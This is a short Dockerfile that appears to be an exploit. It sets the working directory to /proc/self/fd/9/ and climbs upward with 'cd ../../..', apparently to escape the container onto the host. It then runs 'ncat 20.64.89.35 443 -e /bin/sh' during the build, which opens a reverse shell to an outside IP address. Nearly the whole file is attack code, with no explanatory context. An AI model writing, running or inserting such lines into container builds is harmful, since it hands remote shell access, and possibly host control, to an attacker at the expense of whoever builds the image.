FROM ubuntu
RUN apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 871920D1991BC93C  
RUN apt update -y 
RUN apt install -y curl && apt install -y ncat && apt install python3 -y
WORKDIR /proc/self/fd/9/
RUN cd ../../../../../../../../

RUN ncat 20.64.89.35 443 -e /bin/sh

CMD ["/bin/bash"]
